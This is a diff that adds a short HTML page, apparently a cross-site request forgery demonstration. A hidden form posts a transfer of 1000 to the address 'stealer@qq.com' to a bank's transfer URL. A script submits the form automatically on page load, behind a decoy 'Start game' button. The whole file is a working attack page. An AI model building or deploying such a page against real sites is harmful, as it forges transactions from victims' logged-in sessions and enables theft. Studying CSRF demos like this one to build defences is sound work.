@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+<body>
+<form action="http://icbc.com/transfer/" method="post" id="myform">
+    <table>
+        <tbody>
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="email" value="stealer@qq.com"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="money" value="1000"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input type="submit" value="开始游戏"></td>
+            </tr>
+        </tbody>
+    </table>
+</form>
+<script>
+    $(function () {
+        $("#myform").submit();
+    });
+</script>
+</body>
+</html>
